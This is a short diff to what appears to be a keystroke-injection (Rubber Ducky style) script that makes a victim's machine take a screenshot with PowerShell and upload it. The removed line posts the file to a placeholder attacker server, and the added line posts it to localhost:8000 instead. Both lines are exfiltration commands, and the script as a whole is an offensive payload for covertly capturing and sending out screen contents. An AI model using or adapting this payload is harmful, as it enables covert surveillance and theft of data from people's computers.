@@ -14,7 +14,7 @@ STRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System
 ENTER
 DELAY 1000
 REM Upload the screenshot using Invoke-WebRequest
-STRING $FilePath = 'C:\Users\Public\screenshot.png';$Form = @{file = Get-Item $FilePath};Invoke-WebRequest -Uri http://<SERVER>/upload.php -Method Post -Form $Form;
+STRING Invoke-WebRequest -Uri http://localhost:8000 -Method Post  -InFile 'C:\Users\Public\screenshot.png'
 ENTER
 DELAY 2000
 REM Close PowerShell
